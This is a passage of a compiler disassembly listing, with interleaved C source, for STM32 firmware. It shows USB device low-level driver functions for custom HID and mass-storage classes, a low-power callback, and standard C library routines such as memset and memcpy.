 800d12c:	f7f5 f9d9 	bl	80024e2 <HAL_PCD_EP_Receive>
 800d130:	4603      	mov	r3, r0
 800d132:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800d134:	7dbb      	ldrb	r3, [r7, #22]
 800d136:	2b03      	cmp	r3, #3
 800d138:	d816      	bhi.n	800d168 <USBD_LL_PrepareReceive+0x60>
 800d13a:	a201      	add	r2, pc, #4	; (adr r2, 800d140 <USBD_LL_PrepareReceive+0x38>)
 800d13c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800d140:	0800d151 	.word	0x0800d151
 800d144:	0800d157 	.word	0x0800d157
 800d148:	0800d15d 	.word	0x0800d15d
 800d14c:	0800d163 	.word	0x0800d163
    case HAL_OK :
      usb_status = USBD_OK;
 800d150:	2300      	movs	r3, #0
 800d152:	75fb      	strb	r3, [r7, #23]
    break;
 800d154:	e00b      	b.n	800d16e <USBD_LL_PrepareReceive+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800d156:	2303      	movs	r3, #3
 800d158:	75fb      	strb	r3, [r7, #23]
    break;
 800d15a:	e008      	b.n	800d16e <USBD_LL_PrepareReceive+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800d15c:	2301      	movs	r3, #1
 800d15e:	75fb      	strb	r3, [r7, #23]
    break;
 800d160:	e005      	b.n	800d16e <USBD_LL_PrepareReceive+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800d162:	2303      	movs	r3, #3
 800d164:	75fb      	strb	r3, [r7, #23]
    break;
 800d166:	e002      	b.n	800d16e <USBD_LL_PrepareReceive+0x66>
    default :
      usb_status = USBD_FAIL;
 800d168:	2303      	movs	r3, #3
 800d16a:	75fb      	strb	r3, [r7, #23]
    break;
 800d16c:	bf00      	nop
  }
  return usb_status;
 800d16e:	7dfb      	ldrb	r3, [r7, #23]
}
 800d170:	4618      	mov	r0, r3
 800d172:	3718      	adds	r7, #24
 800d174:	46bd      	mov	sp, r7
 800d176:	bd80      	pop	{r7, pc}

0800d178 <USBD_LL_GetRxDataSize>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Received Data Size
  */
uint32_t USBD_LL_GetRxDataSize(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800d178:	b580      	push	{r7, lr}
 800d17a:	b082      	sub	sp, #8
 800d17c:	af00      	add	r7, sp, #0
 800d17e:	6078      	str	r0, [r7, #4]
 800d180:	460b      	mov	r3, r1
 800d182:	70fb      	strb	r3, [r7, #3]
  return HAL_PCD_EP_GetRxCount((PCD_HandleTypeDef*) pdev->pData, ep_addr);
 800d184:	687b      	ldr	r3, [r7, #4]
 800d186:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800d18a:	78fa      	ldrb	r2, [r7, #3]
 800d18c:	4611      	mov	r1, r2
 800d18e:	4618      	mov	r0, r3
 800d190:	f7f5 f9d8 	bl	8002544 <HAL_PCD_EP_GetRxCount>
 800d194:	4603      	mov	r3, r0
}
 800d196:	4618      	mov	r0, r3
 800d198:	3708      	adds	r7, #8
 800d19a:	46bd      	mov	sp, r7
 800d19c:	bd80      	pop	{r7, pc}
	...

0800d1a0 <HAL_PCDEx_LPM_Callback>:
  * @param  hpcd: PCD handle
  * @param  msg: LPM message
  * @retval None
  */
void HAL_PCDEx_LPM_Callback(PCD_HandleTypeDef *hpcd, PCD_LPM_MsgTypeDef msg)
{
 800d1a0:	b580      	push	{r7, lr}
 800d1a2:	b082      	sub	sp, #8
 800d1a4:	af00      	add	r7, sp, #0
 800d1a6:	6078      	str	r0, [r7, #4]
 800d1a8:	460b      	mov	r3, r1
 800d1aa:	70fb      	strb	r3, [r7, #3]
  switch (msg)
 800d1ac:	78fb      	ldrb	r3, [r7, #3]
 800d1ae:	2b00      	cmp	r3, #0
 800d1b0:	d002      	beq.n	800d1b8 <HAL_PCDEx_LPM_Callback+0x18>
 800d1b2:	2b01      	cmp	r3, #1
 800d1b4:	d013      	beq.n	800d1de <HAL_PCDEx_LPM_Callback+0x3e>
      /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
    }
    break;
  }
}
 800d1b6:	e023      	b.n	800d200 <HAL_PCDEx_LPM_Callback+0x60>
    if (hpcd->Init.low_power_enable)
 800d1b8:	687b      	ldr	r3, [r7, #4]
 800d1ba:	699b      	ldr	r3, [r3, #24]
 800d1bc:	2b00      	cmp	r3, #0
 800d1be:	d007      	beq.n	800d1d0 <HAL_PCDEx_LPM_Callback+0x30>
      SystemClockConfig_Resume();
 800d1c0:	f000 f84a 	bl	800d258 <SystemClockConfig_Resume>
      SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800d1c4:	4b10      	ldr	r3, [pc, #64]	; (800d208 <HAL_PCDEx_LPM_Callback+0x68>)
 800d1c6:	691b      	ldr	r3, [r3, #16]
 800d1c8:	4a0f      	ldr	r2, [pc, #60]	; (800d208 <HAL_PCDEx_LPM_Callback+0x68>)
 800d1ca:	f023 0306 	bic.w	r3, r3, #6
 800d1ce:	6113      	str	r3, [r2, #16]
    USBD_LL_Resume(hpcd->pData);
 800d1d0:	687b      	ldr	r3, [r7, #4]
 800d1d2:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800d1d6:	4618      	mov	r0, r3
 800d1d8:	f7fe fa66 	bl	800b6a8 <USBD_LL_Resume>
    break;
 800d1dc:	e010      	b.n	800d200 <HAL_PCDEx_LPM_Callback+0x60>
    USBD_LL_Suspend(hpcd->pData);
 800d1de:	687b      	ldr	r3, [r7, #4]
 800d1e0:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800d1e4:	4618      	mov	r0, r3
 800d1e6:	f7fe fa43 	bl	800b670 <USBD_LL_Suspend>
    if (hpcd->Init.low_power_enable)
 800d1ea:	687b      	ldr	r3, [r7, #4]
 800d1ec:	699b      	ldr	r3, [r3, #24]
 800d1ee:	2b00      	cmp	r3, #0
 800d1f0:	d005      	beq.n	800d1fe <HAL_PCDEx_LPM_Callback+0x5e>
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800d1f2:	4b05      	ldr	r3, [pc, #20]	; (800d208 <HAL_PCDEx_LPM_Callback+0x68>)
 800d1f4:	691b      	ldr	r3, [r3, #16]
 800d1f6:	4a04      	ldr	r2, [pc, #16]	; (800d208 <HAL_PCDEx_LPM_Callback+0x68>)
 800d1f8:	f043 0306 	orr.w	r3, r3, #6
 800d1fc:	6113      	str	r3, [r2, #16]
    break;
 800d1fe:	bf00      	nop
}
 800d200:	bf00      	nop
 800d202:	3708      	adds	r7, #8
 800d204:	46bd      	mov	sp, r7
 800d206:	bd80      	pop	{r7, pc}
 800d208:	e000ed00 	.word	0xe000ed00

0800d20c <USBD_static_malloc>:
  * @brief  Static single allocation.
  * @param  size: Size of allocated memory
  * @retval None
  */
void *USBD_static_malloc(uint32_t size)
{
 800d20c:	b480      	push	{r7}
 800d20e:	b083      	sub	sp, #12
 800d210:	af00      	add	r7, sp, #0
 800d212:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_CUSTOM_HID_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800d214:	4b03      	ldr	r3, [pc, #12]	; (800d224 <USBD_static_malloc+0x18>)
}
 800d216:	4618      	mov	r0, r3
 800d218:	370c      	adds	r7, #12
 800d21a:	46bd      	mov	sp, r7
 800d21c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d220:	4770      	bx	lr
 800d222:	bf00      	nop
 800d224:	20000e74 	.word	0x20000e74

0800d228 <USBD_static_malloc_MSC>:

void *USBD_static_malloc_MSC(uint32_t size)
{
 800d228:	b480      	push	{r7}
 800d22a:	b083      	sub	sp, #12
 800d22c:	af00      	add	r7, sp, #0
 800d22e:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_MSC_BOT_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800d230:	4b03      	ldr	r3, [pc, #12]	; (800d240 <USBD_static_malloc_MSC+0x18>)
}
 800d232:	4618      	mov	r0, r3
 800d234:	370c      	adds	r7, #12
 800d236:	46bd      	mov	sp, r7
 800d238:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d23c:	4770      	bx	lr
 800d23e:	bf00      	nop
 800d240:	20000e9c 	.word	0x20000e9c

0800d244 <USBD_static_free>:
  * @brief  Dummy memory free
  * @param  p: Pointer to allocated  memory address
  * @retval None
  */
void USBD_static_free(void *p)
{
 800d244:	b480      	push	{r7}
 800d246:	b083      	sub	sp, #12
 800d248:	af00      	add	r7, sp, #0
 800d24a:	6078      	str	r0, [r7, #4]

}
 800d24c:	bf00      	nop
 800d24e:	370c      	adds	r7, #12
 800d250:	46bd      	mov	sp, r7
 800d252:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d256:	4770      	bx	lr

0800d258 <SystemClockConfig_Resume>:
  * @brief  Configures system clock after wake-up from USB resume callBack:
  *         enable HSI, PLL and select PLL as system clock source.
  * @retval None
  */
static void SystemClockConfig_Resume(void)
{
 800d258:	b580      	push	{r7, lr}
 800d25a:	af00      	add	r7, sp, #0
  SystemClock_Config();
 800d25c:	f7f3 fda6 	bl	8000dac <SystemClock_Config>
}
 800d260:	bf00      	nop
 800d262:	bd80      	pop	{r7, pc}

0800d264 <memset>:
 800d264:	4402      	add	r2, r0
 800d266:	4603      	mov	r3, r0
 800d268:	4293      	cmp	r3, r2
 800d26a:	d100      	bne.n	800d26e <memset+0xa>
 800d26c:	4770      	bx	lr
 800d26e:	f803 1b01 	strb.w	r1, [r3], #1
 800d272:	e7f9      	b.n	800d268 <memset+0x4>

0800d274 <__libc_init_array>:
 800d274:	b570      	push	{r4, r5, r6, lr}
 800d276:	4d0d      	ldr	r5, [pc, #52]	; (800d2ac <__libc_init_array+0x38>)
 800d278:	4c0d      	ldr	r4, [pc, #52]	; (800d2b0 <__libc_init_array+0x3c>)
 800d27a:	1b64      	subs	r4, r4, r5
 800d27c:	10a4      	asrs	r4, r4, #2
 800d27e:	2600      	movs	r6, #0
 800d280:	42a6      	cmp	r6, r4
 800d282:	d109      	bne.n	800d298 <__libc_init_array+0x24>
 800d284:	4d0b      	ldr	r5, [pc, #44]	; (800d2b4 <__libc_init_array+0x40>)
 800d286:	4c0c      	ldr	r4, [pc, #48]	; (800d2b8 <__libc_init_array+0x44>)
 800d288:	f000 f826 	bl	800d2d8 <_init>
 800d28c:	1b64      	subs	r4, r4, r5
 800d28e:	10a4      	asrs	r4, r4, #2
 800d290:	2600      	movs	r6, #0
 800d292:	42a6      	cmp	r6, r4
 800d294:	d105      	bne.n	800d2a2 <__libc_init_array+0x2e>
 800d296:	bd70      	pop	{r4, r5, r6, pc}
 800d298:	f855 3b04 	ldr.w	r3, [r5], #4
 800d29c:	4798      	blx	r3
 800d29e:	3601      	adds	r6, #1
 800d2a0:	e7ee      	b.n	800d280 <__libc_init_array+0xc>
 800d2a2:	f855 3b04 	ldr.w	r3, [r5], #4
 800d2a6:	4798      	blx	r3
 800d2a8:	3601      	adds	r6, #1
 800d2aa:	e7f2      	b.n	800d292 <__libc_init_array+0x1e>
 800d2ac:	0800d530 	.word	0x0800d530
 800d2b0:	0800d530 	.word	0x0800d530
 800d2b4:	0800d530 	.word	0x0800d530
 800d2b8:	0800d534 	.word	0x0800d534

0800d2bc <memcpy>:
 800d2bc:	440a      	add	r2, r1
 800d2be:	4291      	cmp	r1, r2
 800d2c0:	f100 33ff 	add.w	r3, r0, #4294967295
 800d2c4:	d100      	bne.n	800d2c8 <memcpy+0xc>
 800d2c6:	4770      	bx	lr
 800d2c8:	b510      	push	{r4, lr}
 800d2ca:	f811 4b01 	ldrb.w	r4, [r1], #1
 800d2ce:	f803 4f01 	strb.w	r4, [r3, #1]!
 800d2d2:	4291      	cmp	r1, r2
 800d2d4:	d1f9      	bne.n	800d2ca <memcpy+0xe>
 800d2d6:	bd10      	pop	{r4, pc}

0800d2d8 <_init>:
 800d2d8:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d2da:	bf00      	nop
 800d2dc:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d2de:	bc08      	pop	{r3}
 800d2e0:	469e      	mov	lr, r3
 800d2e2:	4770      	bx	lr

0800d2e4 <_fini>:
 800d2e4:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d2e6:	bf00      	nop
 800d2e8:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d2ea:	bc08      	pop	{r3}
 800d2ec:	469e      	mov	lr, r3
 800d2ee:	4770      	bx	lr
